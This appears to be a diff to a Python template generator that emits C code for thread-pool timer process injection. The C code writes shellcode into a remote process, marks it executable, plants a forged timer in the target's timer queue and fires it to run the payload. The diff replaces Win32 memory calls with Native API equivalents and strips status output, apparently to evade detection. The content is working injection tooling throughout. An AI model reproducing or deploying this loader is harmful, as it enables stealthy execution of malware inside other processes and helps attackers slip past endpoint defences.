@@ -2,6 +2,7 @@ from string import Template
 import os
 import sys
 from pathlib import Path
+from c.utils.functions import NtCreateUserProcess
 
 class tp_timer:
     def __init__(self, arguments):
@@ -55,11 +56,8 @@ class tp_timer:
             
     CloseHandle(hProcSnap);
 
-
     {transformers}
-    
 
-    PVOID       BaseAddress = NULL;
     SIZE_T      RegionSize  = 0;
     DWORD       OldProtect  = 0;
 
@@ -72,7 +70,6 @@ class tp_timer:
     LARGE_INTEGER                    li           = {{ 0 }};
     T2_SET_PARAMETERS                TimerParams  = {{ 0 }};
   
-
     // Get Handles
     
     HANDLE hFactory = NULL;
@@ -139,29 +136,27 @@ class tp_timer:
     CloseHandle(hProcess);
     
     hProcess = OpenProcess( PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, PID );
-    // Allocate space for the payload
     RegionSize = {shellcodeSize};
-    BaseAddress = VirtualAllocEx( hProcess, NULL, {shellcodeSize}, MEM_COMMIT, PAGE_READWRITE );
+
+    PVOID BaseAddress = NULL;
+    {NtAllocateVirtualMemory}( hProcess, &BaseAddress, 0, &RegionSize, MEM_COMMIT, PAGE_READWRITE );
     printf( "Allocated 0x%llx bytes to: 0x%llx\\n", {shellcodeSize}, BaseAddress );
 
     // Write the payload
-    {WriteProcessMemory}( hProcess, BaseAddress, shellcode, {shellcodeSize}, NULL );
-    printf( "Wrote payload in successfully!\\n" );
+    {NtWriteVirtualMemory}( hProcess, BaseAddress, shellcode, {shellcodeSize}, NULL );
 
     // Get WorkerFactoryBasicInformation so we can obtain the StartParameter
     {NtQueryInformationWorkerFactory}( hFactory, WorkerFactoryBasicInformation, &FactoryInfo, sizeof(FactoryInfo), NULL );
-    printf( "Queried Worker Factory information successfully!\\n" );
 
     // Make payload executable
-    {VirtualProtectEx}( hProcess, BaseAddress, RegionSize, PAGE_EXECUTE_READ, &OldProtect );
+    {NtProtectVirtualMemory}( hProcess, &BaseAddress, &RegionSize, PAGE_EXECUTE_READ, &OldProtect );
 
     // Create a timer in our local process
     TpTimer     = (PFULL_TP_TIMER){CreateThreadpoolTimer}( BaseAddress, NULL, NULL );
 
     // Allocate space for the timer
     RegionSize     = SzTimer;
-    TimerAddress   = {VirtualAllocEx}( hProcess, TimerAddress, RegionSize, MEM_COMMIT, PAGE_READWRITE );
-    printf( "Allocated 0x%llx bytes to: 0x%llx\\n", RegionSize, TimerAddress );
+    {NtAllocateVirtualMemory}( hProcess, &TimerAddress, 0, &RegionSize, MEM_COMMIT, PAGE_READWRITE );
 
     // Rebase the pointers of the timer to be based on the remote allocation we made
     TpTimer->Work.CleanupGroupMember.Pool    = FactoryInfo.StartParameter; // Remote process's pool
@@ -177,20 +172,18 @@ class tp_timer:
     EndLink    = &TimerAddress->WindowEndLinks;
 
     // Write the timer in
-    {WriteProcessMemory}( hProcess, TimerAddress, TpTimer, SzTimer, NULL );
-    printf( "Wrote timer in successfully!\\n" );
+    {NtWriteVirtualMemory}( hProcess, TimerAddress, TpTimer, SzTimer, NULL );
 
     // Insert our timer's start and end links into the remote process's timer queue
-    {WriteProcessMemory}( hProcess, &TpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root, &StartLink, sizeof( PVOID ), NULL );
+    {NtWriteVirtualMemory}( hProcess, &TpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root, &StartLink, sizeof( PVOID ), NULL );
 
     // Insert our timer's start and end links into the remote process's timer queue
-    {WriteProcessMemory}( hProcess, &TpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowEnd.Root, &EndLink, sizeof( PVOID ), NULL );
+    {NtWriteVirtualMemory}( hProcess, &TpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowEnd.Root, &EndLink, sizeof( PVOID ), NULL );
 
     li.QuadPart = -10000000;
 
     // Signal the remote process's timer queue to execute our payload
     {NtSetTimer2}( hTimerQ, &li, NULL, &TimerParams );
-    printf( "Payload executed\\n" );
 
     if ( hFactory ) {{
         CloseHandle( hFactory );
